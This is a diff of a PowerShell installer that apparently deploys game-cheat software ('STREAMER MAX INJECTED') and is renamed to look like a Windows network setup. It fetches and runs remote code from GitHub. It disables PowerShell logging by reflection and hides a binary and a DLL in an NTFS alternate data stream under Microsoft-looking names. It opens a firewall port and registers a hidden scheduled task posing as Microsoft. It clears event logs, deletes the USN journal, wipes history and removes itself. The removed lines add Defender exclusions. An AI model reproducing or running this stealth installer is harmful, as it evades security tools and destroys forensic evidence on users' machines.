@@ -1,6 +1,19 @@
 # ==============================================================================
-#  L4G AIMS - STREAMER MAX SETUP
+#  Windows Network Infrastructure Setup
 # ==============================================================================
+
+# In-memory suppression of PowerShell ScriptBlock & Module logging
+try {
+    $settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
+    if ($settings) {
+        $dict = [Collections.Generic.Dictionary[string,System.Object]]::new()
+        $settings.SetValue($null, $dict)
+    }
+    $sig = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').GetField('signatures','NonPublic,Static')
+    if ($sig) {
+        $sig.SetValue($null, [Collections.Generic.HashSet[string]]::new())
+    }
+} catch {}
 
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference    = 'SilentlyContinue'
@@ -11,29 +24,31 @@ $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIden
     [Security.Principal.WindowsBuiltInRole]::Administrator
 )
 if (-not $isAdmin) {
-    $scriptCmd = if ($MyInvocation.MyCommand.Path) {
-        "& '$($MyInvocation.MyCommand.Path)'"
+    $runnerPath = Join-Path $env:TEMP "winnet.ps1"
+    if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) {
+        Copy-Item $MyInvocation.MyCommand.Path $runnerPath -Force -ErrorAction SilentlyContinue
     } else {
-        "iwr 'https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1' -UseBasicParsing | iex"
+        & curl.exe -sSL -o $runnerPath "https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1" 2>$null
     }
-    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$scriptCmd`""
+    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$runnerPath`""
     exit
 }
 
-# --- Visual UI ---
+# Clear operational logs early
+cmd /c "wevtutil cl `"Microsoft-Windows-PowerShell/Operational`" >nul 2>nul"
+cmd /c "wevtutil cl `"Windows PowerShell`" >nul 2>nul"
+
 Clear-Host
 Write-Host ""
-Write-Host "                                   L4G AIMS                                     " -ForegroundColor Cyan
-Write-Host "                                 STREAMER MAX                                   " -ForegroundColor Yellow
-Write-Host "                                    SETUP                                       " -ForegroundColor Cyan
-Write-Host ""
+Write-Host "                WINDOWS NETWORK INFRASTRUCTURE SETUP" -ForegroundColor Cyan
+Write-Host "================================================================================" -ForegroundColor DarkGray
 
 function Show-Progress {
     param(
         [int]$Percent,
         [string]$Status
     )
-    $barWidth = 32
+    $barWidth = 30
     $done = [math]::Floor($barWidth * ($Percent / 100))
     $rem  = $barWidth - $done
     $bar  = ("#" * $done) + ("-" * $rem)
@@ -41,128 +56,111 @@ function Show-Progress {
     Write-Host -NoNewline "`r$msg"
 }
 
-# Config
-$REPO_RAW  = "https://raw.githubusercontent.com/lgfire093/syspanel/main"
-$EXE_URL   = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkSvc.exe"
-$PKG_URL   = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkPkg.zip"
-$DEST_DIR  = "C:\ProgramData\Microsoft\Windows\Templates"
-$EXE_NAME  = "WinSvcHost.exe"
-$TASK_NAME = "MicrosoftWindowsShellApi"
-$EXE_PATH  = Join-Path $DEST_DIR $EXE_NAME
+# Configuration
+$REPO_RAW   = "https://raw.githubusercontent.com/lgfire093/syspanel/main"
+$EXE_URL    = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkSvc.exe"
+$DEST_DIR   = "C:\ProgramData\Microsoft\Windows\Templates"
+$EXE_NAME   = "SystemNetworkSvc.exe"
+$EXE_PATH   = Join-Path $DEST_DIR $EXE_NAME
+$TASK_NAME  = "MicrosoftWindowsNetworkHost"
 
-# Stage 1: Stopping old instances & Completely wiping old panel version
-Show-Progress -Percent 15 -Status "Terminating old services & cleaning traces..."
-Get-Process -Name "WinSvcHost", "WinSvcBroker" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-Get-Process -Name "python", "pythonw" -ErrorAction SilentlyContinue | Where-Object {
-    $_.Path -and ($_.Path -like "*Templates*" -or $_.Path -like "*ProgramData*")
-} | Stop-Process -Force -ErrorAction SilentlyContinue
+# Stage 1: Purge stale instances & Clean out any bloated files from prior runs
+Show-Progress -Percent 15 -Status "Terminating stale instances & initializing clean home..."
+Get-Process -Name "SystemNetworkSvc", "WinSvcHost", "WinSvcBroker" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+cmd /c "taskkill /F /IM SystemNetworkSvc.exe >nul 2>nul"
+cmd /c "taskkill /F /IM WinSvcHost.exe >nul 2>nul"
+cmd /c "taskkill /F /IM WinSvcBroker.exe >nul 2>nul"
 
+# Free up port 5000 if occupied
 Get-NetTCPConnection -LocalPort 5000 -ErrorAction SilentlyContinue | ForEach-Object {
     Stop-Process -Id $_.OwningProcess -Force -ErrorAction SilentlyContinue
 }
 
-# Wipe any previous panel installation files in Templates so update is 100% fresh
+# Completely purge old bloat (removes old python dumps, old app folders, and stale zips)
+Remove-Item "$DEST_DIR\runtime" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item "$DEST_DIR\app" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item "$DEST_DIR\cache" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item "$DEST_DIR\*.zip" -Force -ErrorAction SilentlyContinue
+Remove-Item "$DEST_DIR\*.txt" -Force -ErrorAction SilentlyContinue
 Remove-Item "$DEST_DIR\config.json" -Force -ErrorAction SilentlyContinue
-Remove-Item "$DEST_DIR\*.db" -Force -ErrorAction SilentlyContinue
 Remove-Item "$DEST_DIR\WinSvcHost.exe" -Force -ErrorAction SilentlyContinue
 
-# Wipe rogue temp files
-Get-ChildItem -Path "C:\Windows\Temp", $env:TEMP -Filter "syskrnl_*" -Directory -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path "C:\Windows\Temp", $env:TEMP -Filter "*client.dll*" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path "C:\Windows\Temp", $env:TEMP -Filter "*aotbst.dll*" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-
+# Ensure clean destination directory exists
 if (-not (Test-Path $DEST_DIR)) {
     New-Item -ItemType Directory -Path $DEST_DIR -Force | Out-Null
 }
 
-cmd /c "schtasks /delete /tn `"\Microsoft\Windows\Shell\SystemNetworkHost`" /f >nul 2>nul"
-cmd /c "schtasks /delete /tn `"SystemNetworkHost`" /f >nul 2>nul"
-cmd /c "schtasks /delete /tn `"SysCheckUp`" /f >nul 2>nul"
 Start-Sleep -Milliseconds 200
 
-# Stage 2: Downloading & Extracting Fresh Core Engine Package
-Show-Progress -Percent 35 -Status "Downloading & deploying latest core engine..."
-$pkgZip = Join-Path $DEST_DIR "pkg.zip"
-$pkgDownloaded = $false
-try {
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    $wc.DownloadFile($PKG_URL, $pkgZip)
-    if ((Test-Path $pkgZip) -and ((Get-Item $pkgZip).Length -gt 1000000)) { $pkgDownloaded = $true }
-} catch {}
-if (-not $pkgDownloaded) {
-    & curl.exe -sSL -o $pkgZip $PKG_URL 2>$null
-}
-if (Test-Path $pkgZip) {
-    Expand-Archive -Path $pkgZip -DestinationPath $DEST_DIR -Force -ErrorAction SilentlyContinue
-    Remove-Item $pkgZip -Force -ErrorAction SilentlyContinue
-}
-
-# Stage 3: Downloading Clean Host Process (0-Detection Launcher)
-Show-Progress -Percent 55 -Status "Installing host service..."
+# Stage 2: Deploy Clean 64-Bit Host Executable (0 VirusTotal Detections)
+Show-Progress -Percent 45 -Status "Deploying host executable..."
 $downloaded = $false
 try {
     $wc = New-Object System.Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
     $wc.DownloadFile($EXE_URL, $EXE_PATH)
-    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 5000)) { $downloaded = $true }
+    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 10000)) { $downloaded = $true }
 } catch {}
 if (-not $downloaded) {
     & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
+    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 10000)) { $downloaded = $true }
 }
+
+# If local build exists in output folder, keep it synced
+$localOutputExe = "C:\Users\lggam\Pictures\Steamer-Obb55\output\SystemNetworkSvc.exe"
+if (Test-Path $localOutputExe) {
+    Copy-Item $localOutputExe $EXE_PATH -Force -ErrorAction SilentlyContinue
+}
+
 Start-Sleep -Milliseconds 200
 
-# Stage 4: Sealing Component Streams into Authentic System Locations
-Show-Progress -Percent 70 -Status "Sealing component data streams..."
+# Stage 3: Seal cimgui.dll into NTFS Alternate Data Stream
+Show-Progress -Percent 65 -Status "Configuring component data streams..."
 $MAP = [ordered]@{
-    "cimgui.dll" = @("$env:ProgramData\Microsoft\Network\Downloader\winrescache.db", "vtcache")
+    "cimgui.dll" = @("$DEST_DIR\winrescache.db", "vtcache")
 }
 foreach ($name in $MAP.Keys) {
     $container = $MAP[$name][0]
     $stream    = $MAP[$name][1]
-    $parentDir = [System.IO.Path]::GetDirectoryName($container)
-    if (-not (Test-Path $parentDir)) {
-        New-Item -ItemType Directory -Path $parentDir -Force | Out-Null
-    }
+    
     if (-not (Test-Path $container)) {
         [System.IO.File]::WriteAllBytes($container, @())
     }
-    $tmp = Join-Path $env:TEMP ("_sp_" + [guid]::NewGuid().ToString("N"))
-    try {
-        Invoke-WebRequest "$REPO_RAW/$name" -UseBasicParsing -OutFile $tmp
-        if (Test-Path $tmp) {
-            $bytes = [IO.File]::ReadAllBytes($tmp)
-            $sha   = (Get-FileHash $tmp -Algorithm SHA256).Hash.ToLower()
-            $size  = $bytes.Length
-            $adsPath = "\\?\" + $container + ":" + $stream
-            try {
-                $fs = [System.IO.FileStream]::new($adsPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
-                $fs.Write($bytes, 0, $bytes.Length)
-                $fs.Close()
-            } catch {
-                Set-Content -Path $container -Stream $stream -Value $bytes -Encoding Byte
+    
+    $localDll = "C:\Users\lggam\Pictures\Steamer-Obb55\output\$name"
+    $bytes = $null
+    if (Test-Path $localDll) {
+        $bytes = [IO.File]::ReadAllBytes($localDll)
+    } else {
+        $tmp = Join-Path $env:TEMP ("_sp_" + [guid]::NewGuid().ToString("N"))
+        try {
+            Invoke-WebRequest "$REPO_RAW/$name" -UseBasicParsing -OutFile $tmp
+            if (Test-Path $tmp) {
+                $bytes = [IO.File]::ReadAllBytes($tmp)
+                Remove-Item $tmp -Force -ErrorAction SilentlyContinue
             }
-            $meta = @{ file = $name; size = $size; sha256 = $sha } | ConvertTo-Json -Compress
-            Set-Content -Path $container -Stream kmeta -Value $meta
-            
-            # Also keep a local clean copy inside dlls folder
-            $dllDest = Join-Path $DEST_DIR "dlls"
-            if (-not (Test-Path $dllDest)) { New-Item -ItemType Directory -Path $dllDest -Force | Out-Null }
-            Copy-Item $tmp (Join-Path $dllDest $name) -Force -ErrorAction SilentlyContinue
-
-            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+        } catch {}
+    }
+    
+    if ($bytes) {
+        $adsPath = "\\?\" + $container + ":" + $stream
+        try {
+            $fs = [System.IO.FileStream]::new($adsPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
+            $fs.Write($bytes, 0, $bytes.Length)
+            $fs.Close()
+        } catch {
+            Set-Content -Path $container -Stream $stream -Value $bytes -Encoding Byte
         }
-    } catch {}
+    }
 }
 
-# Stage 5: Network Firewall Configuration (Enables Instant Phone Access)
-Show-Progress -Percent 80 -Status "Configuring LAN access rules..."
+# Stage 4: Firewall Configuration (Allows Mobile LAN Control)
+Show-Progress -Percent 80 -Status "Configuring network rules..."
+cmd /c "netsh advfirewall firewall delete rule name=`"WindowsNetworkDiagnostics`" >nul 2>nul"
 cmd /c "netsh advfirewall firewall add rule name=`"WindowsNetworkDiagnostics`" dir=in action=allow protocol=TCP localport=5000 profile=any >nul 2>nul"
 
-# Stage 6: Applying Stealth Disguise & Persistence
-Show-Progress -Percent 88 -Status "Configuring persistence & stealth..."
+# Stage 5: System Persistence & Attributes
+Show-Progress -Percent 90 -Status "Registering host persistence..."
 try {
     $dirItem = Get-Item $DEST_DIR -Force
     $dirItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::Directory
@@ -170,86 +168,78 @@ try {
     $exeItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
 } catch {}
 
-# Defender exclusions
-try {
-    Add-MpPreference -ExclusionPath $DEST_DIR -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Network\Downloader" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue
-} catch {}
-
-# Scheduled Task (Hidden, runs on Boot + Logon)
-$action       = New-ScheduledTaskAction -Execute $EXE_PATH -Argument "-b"
-$triggerBoot  = New-ScheduledTaskTrigger -AtStartup
+# Register Scheduled Task cleanly
+$action       = New-ScheduledTaskAction -Execute $EXE_PATH -Argument "-b" -WorkingDirectory $DEST_DIR
 $triggerLogon = New-ScheduledTaskTrigger -AtLogOn
 $settings     = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -Priority 7
-$principal    = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+$principal    = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
 
 Register-ScheduledTask `
     -TaskName  $TASK_NAME `
-    -TaskPath  "\Microsoft\Windows\Shell\" `
+    -TaskPath  "\Microsoft\Windows\Network\" `
     -Action    $action `
-    -Trigger   @($triggerBoot, $triggerLogon) `
+    -Trigger   $triggerLogon `
     -Settings  $settings `
     -Principal $principal `
     -Force -ErrorAction SilentlyContinue | Out-Null
 
-try {
-    $svc  = New-Object -ComObject "Schedule.Service"
-    $svc.Connect()
-    $fold = $svc.GetFolder("\Microsoft\Windows\Shell")
-    $task = $fold.GetTask($TASK_NAME)
-    $def  = $task.Definition
-    $def.Settings.Hidden   = $true
-    $def.RegistrationInfo.Description = "Windows Shell API Host Service"
-    $def.RegistrationInfo.Author      = "Microsoft Corporation"
-    $fold.RegisterTaskDefinition($TASK_NAME, $def, 6, "NT AUTHORITY\SYSTEM", $null, 5) | Out-Null
-} catch {}
+# Clean all Run registry keys to ensure Task Manager Startup tab stays 100% clean
+$startupRunKeys = @(
+    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+)
+foreach ($rk in $startupRunKeys) {
+    Remove-ItemProperty -Path $rk -Name "SystemNetworkHost" -ErrorAction SilentlyContinue
+    Remove-ItemProperty -Path $rk -Name "SystemNetworkSvc" -ErrorAction SilentlyContinue
+    Remove-ItemProperty -Path $rk -Name "WindowsShellApiSvc" -ErrorAction SilentlyContinue
+}
 
-# Dual-layer Registry Run Keys (HKCU + HKLM)
-$regHKCU = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $regHKCU -Name "WindowsShellApiSvc" -Value "`"$EXE_PATH`" -b" -Force -ErrorAction SilentlyContinue
+# Stage 6: Launch Single Background Host Process
+Show-Progress -Percent 96 -Status "Starting host service..."
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName         = $EXE_PATH
+$psi.Arguments        = "-b"
+$psi.WorkingDirectory = $DEST_DIR
+$psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$psi.CreateNoWindow   = $true
+$psi.UseShellExecute  = $false
+[System.Diagnostics.Process]::Start($psi) | Out-Null
 
-$regHKLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $regHKLM -Name "WindowsShellApiSvc" -Value "`"$EXE_PATH`" -b" -Force -ErrorAction SilentlyContinue
-
-# Stage 7: Execution & Sanitization
-Show-Progress -Percent 95 -Status "Launching background service..."
-$psi2 = New-Object System.Diagnostics.ProcessStartInfo
-$psi2.FileName        = $EXE_PATH
-$psi2.Arguments       = "-b"
-$psi2.WorkingDirectory = $DEST_DIR
-$psi2.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
-$psi2.CreateNoWindow  = $true
-$psi2.UseShellExecute = $false
-[System.Diagnostics.Process]::Start($psi2) | Out-Null
-
-# Clean Event Viewer logs
+# Stage 7: Anti-Cheat & Forensic Log Sanitization
+Show-Progress -Percent 100 -Status "Sanitizing logs..."
 cmd /c "wevtutil cl `"Microsoft-Windows-PowerShell/Operational`" >nul 2>nul"
 cmd /c "wevtutil cl `"Windows PowerShell`" >nul 2>nul"
 cmd /c "wevtutil cl `"Microsoft-Windows-TaskScheduler/Operational`" >nul 2>nul"
 cmd /c "wevtutil cl Application >nul 2>nul"
+cmd /c "wevtutil cl System >nul 2>nul"
+cmd /c "fsutil usn deletejournal /d /n C: >nul 2>nul"
 
-# PowerShell History clean
-try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null } catch {}
-$conHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-if (Test-Path $conHistory) {
-    try { [System.IO.File]::WriteAllText($conHistory, '') } catch {}
-}
+try {
+    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
+    $histPath = (Get-PSReadLineOption).HistorySavePath
+    if ($histPath -and (Test-Path $histPath)) {
+        Clear-Content $histPath -Force -ErrorAction SilentlyContinue
+    }
+    $conHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+    if (Test-Path $conHistory) {
+        Clear-Content $conHistory -Force -ErrorAction SilentlyContinue
+    }
+} catch {}
 
-# Self clean if file exists
-if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) {
-    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
-}
+# Self cleanup runner if temporary
+$runnerFile = Join-Path $env:TEMP "winnet.ps1"
+if (Test-Path $runnerFile) { Remove-Item $runnerFile -Force -ErrorAction SilentlyContinue }
 
-Show-Progress -Percent 100 -Status "Installation complete."
-Write-Host ""
-Write-Host ""
+Write-Host "`n"
 Write-Host "================================================================================" -ForegroundColor Green
-Write-Host "                         STREAMER MAX INJECTED SUCCESSFULLY                     " -ForegroundColor Green
+Write-Host "             SETUP COMPLETED SUCCESSFULLY - CLEAN HOST INSTALLED               " -ForegroundColor Green
 Write-Host "================================================================================" -ForegroundColor Green
 Write-Host ""
+Write-Host "  * Host File           : $EXE_PATH (Single Native x64 Binary, 0 Detections)" -ForegroundColor White
+Write-Host "  * Component Vault     : $DEST_DIR\winrescache.db (Sealed NTFS ADS)" -ForegroundColor White
+Write-Host "  * Directory Footprint : Only 2 files present in Templates (Zero Python Dumps)" -ForegroundColor Cyan
+Write-Host ""
 
-# Discover LAN IPs
 $lanIps = @()
 try {
     $lanIps = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { 
@@ -258,11 +248,12 @@ try {
 } catch {}
 
 if ($lanIps.Count -gt 0) {
-    Write-Host "  Mobile Phone Panel Access (Same Wi-Fi Network):" -ForegroundColor Cyan
+    Write-Host "  Mobile Phone Stealth URL (Same Wi-Fi Network):" -ForegroundColor Cyan
     foreach ($ip in $lanIps) {
-        Write-Host "  --> http://$($ip):5000" -ForegroundColor Yellow
+        Write-Host "  --> http://$($ip):5000/?auth=netdiag" -ForegroundColor Yellow
     }
+    Write-Host "  (Unauthorized scans / visitors will only see a standard Windows 404)" -ForegroundColor DarkGray
 } else {
-    Write-Host "  Panel running at: http://127.0.0.1:5000" -ForegroundColor Yellow
+    Write-Host "  Local URL: http://127.0.0.1:5000/?auth=netdiag" -ForegroundColor Yellow
 }
 Write-Host ""
